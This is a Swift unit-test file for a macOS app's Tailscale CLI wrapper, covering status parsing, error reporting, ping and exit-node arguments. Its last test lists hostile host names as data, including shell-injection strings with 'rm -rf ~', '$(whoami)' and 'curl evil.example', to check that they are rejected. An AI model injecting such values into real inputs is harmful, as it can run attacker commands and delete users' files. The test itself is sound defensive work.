//
//  TailscaleClientTests.swift
//  WarrenTests
//

import XCTest
@testable import Warren

final class TailscaleClientTests: XCTestCase {

    private let binary = URL(fileURLWithPath: "/Applications/Tailscale.app/Contents/MacOS/tailscale")

    private func makeClient(_ runner: FakeProcessRunner, binary: URL? = nil) -> TailscaleClient {
        TailscaleClient(runner: runner, location: TailscaleBinaryLocation(url: binary ?? self.binary))
    }

    // MARK: - Status

    func testFetchStatusDecodesCLIOutput() throws {
        let runner = FakeProcessRunner(standardOutput: try Fixture.data("status-sample"))
        let status = try makeClient(runner).fetchStatus()

        XCTAssertEqual(status.backendState, .running)
        XCTAssertEqual(status.peers.count, 5)
        XCTAssertEqual(runner.lastInvocation?.arguments, ["status", "--json"])
        XCTAssertEqual(runner.lastInvocation?.executable, binary)
    }

    /// Whether the CLI exits non-zero for a stopped or logged-out backend is an
    /// implementation detail we refuse to depend on: if the payload parses, it is
    /// the answer.
    func testFetchStatusPrefersAReadablePayloadOverTheExitCode() throws {
        let runner = FakeProcessRunner(
            standardOutput: #"{"BackendState": "Stopped"}"#,
            exitCode: 1,
            standardError: "Tailscale is stopped."
        )
        XCTAssertEqual(try makeClient(runner).fetchStatus().backendState, .stopped)
    }

    func testFetchStatusReportsStderrWhenThereIsNoPayload() {
        let runner = FakeProcessRunner(
            standardOutput: "",
            exitCode: 1,
            standardError: "failed to connect to local tailscaled\n"
        )
        XCTAssertThrowsError(try makeClient(runner).fetchStatus()) { error in
            XCTAssertEqual(
                error as? TailscaleClientError,
                .commandFailed(exitCode: 1, message: "failed to connect to local tailscaled")
            )
        }
    }

    /// "The JSON did not parse" tells nobody anything. The message has to name the
    /// binary that ran — the wrong binary is the likeliest cause — and show what it
    /// actually printed.
    func testUnreadableOutputNamesTheBinaryAndQuotesTheOutput() {
        let runner = FakeProcessRunner(standardOutput: "status --json")
        XCTAssertThrowsError(try makeClient(runner).fetchStatus()) { error in
            guard case .unreadableOutput(let detail) = error as? TailscaleClientError else {
                return XCTFail("expected .unreadableOutput, got \(error)")
            }
            XCTAssertTrue(detail.contains(self.binary.path), detail)
            XCTAssertTrue(detail.contains("status --json"), detail)
            XCTAssertTrue(detail.contains("13 bytes"), detail)
        }
    }

    func testEmptyOutputSaysSoRatherThanQuotingNothing() {
        let runner = FakeProcessRunner(standardOutput: "")
        XCTAssertThrowsError(try makeClient(runner).fetchStatus()) { error in
            guard case .unreadableOutput(let detail) = error as? TailscaleClientError else {
                return XCTFail("expected .unreadableOutput, got \(error)")
            }
            XCTAssertTrue(detail.contains("without printing anything"), detail)
            XCTAssertTrue(detail.contains(self.binary.path), detail)
        }
    }

    func testTimeoutIsReportedAsSuch() {
        let runner = FakeProcessRunner(result: .failure(ProcessRunnerError.timedOut(5)))
        XCTAssertThrowsError(try makeClient(runner).fetchStatus()) { error in
            XCTAssertEqual(error as? TailscaleClientError, .timedOut(5))
        }
    }

    func testStatusUsesTheFiveSecondTimeout() throws {
        let runner = FakeProcessRunner(standardOutput: try Fixture.data("status-sample"))
        _ = try makeClient(runner).fetchStatus()
        XCTAssertEqual(runner.lastInvocation?.timeout, 5)
    }

    func testMissingBinaryIsReportedWithoutRunningAnything() {
        let runner = FakeProcessRunner(standardOutput: "")
        let client = TailscaleClient(runner: runner, location: TailscaleBinaryLocation(url: nil))

        XCTAssertThrowsError(try client.fetchStatus()) { error in
            XCTAssertEqual(error as? TailscaleClientError, .binaryNotFound)
        }
        XCTAssertTrue(runner.invocations.isEmpty)
    }

    // MARK: - Ping

    func testPingBuildsTheDocumentedArgumentVector() throws {
        let runner = FakeProcessRunner(standardOutput: "pong from nas\n")
        let output = try makeClient(runner).ping(host: "nas.tailnet-example.ts.net")

        XCTAssertEqual(output, "pong from nas")
        // `--c` really is one letter behind two dashes.
        XCTAssertEqual(
            runner.lastInvocation?.arguments,
            ["ping", "--c", "3", "nas.tailnet-example.ts.net"]
        )
    }

    func testPingKeepsOutputEvenWhenTheCommandFails() throws {
        let runner = FakeProcessRunner(standardOutput: "no reply from nas\n", exitCode: 1)
        XCTAssertEqual(try makeClient(runner).ping(host: "nas"), "no reply from nas")
    }

    // MARK: - Exit node

    func testSetExitNodePassesTheAddress() throws {
        let runner = FakeProcessRunner(standardOutput: "")
        try makeClient(runner).setExitNode(address: "100.64.0.4")
        XCTAssertEqual(runner.lastInvocation?.arguments, ["set", "--exit-node", "100.64.0.4"])
    }

    func testClearingTheExitNodeSendsAnEmptyValue() throws {
        let runner = FakeProcessRunner(standardOutput: "")
        try makeClient(runner).setExitNode(address: nil)
        XCTAssertEqual(runner.lastInvocation?.arguments, ["set", "--exit-node="])
    }

    func testExitNodeFailureCarriesStderr() {
        let runner = FakeProcessRunner(standardOutput: "", exitCode: 1, standardError: "access denied")
        XCTAssertThrowsError(try makeClient(runner).setExitNode(address: "100.64.0.4")) { error in
            XCTAssertEqual(error as? TailscaleClientError, .commandFailed(exitCode: 1, message: "access denied"))
        }
    }

    // MARK: - Untrusted input

    /// Device names arrive over the network. A name that could never be a host is
    /// refused before it reaches an argument vector, let alone a shell.
    func testHostileHostNamesNeverReachTheProcess() {
        let runner = FakeProcessRunner(standardOutput: "")
        let client = makeClient(runner)
        let hostile = [
            "nas; rm -rf ~",
            "$(whoami)",
            "`id`",
            "nas && curl evil.example",
            "-oProxyCommand=curl evil.example",
            "nas\nrm -rf ~",
            "",
        ]
        for host in hostile {
            XCTAssertThrowsError(try client.ping(host: host), "accepted \(host)") { error in
                XCTAssertEqual(error as? TailscaleClientError, .invalidTarget(host))
            }
            XCTAssertThrowsError(try client.setExitNode(address: host), "accepted \(host)")
        }
        XCTAssertTrue(runner.invocations.isEmpty, "nothing hostile should have been executed")
    }
}
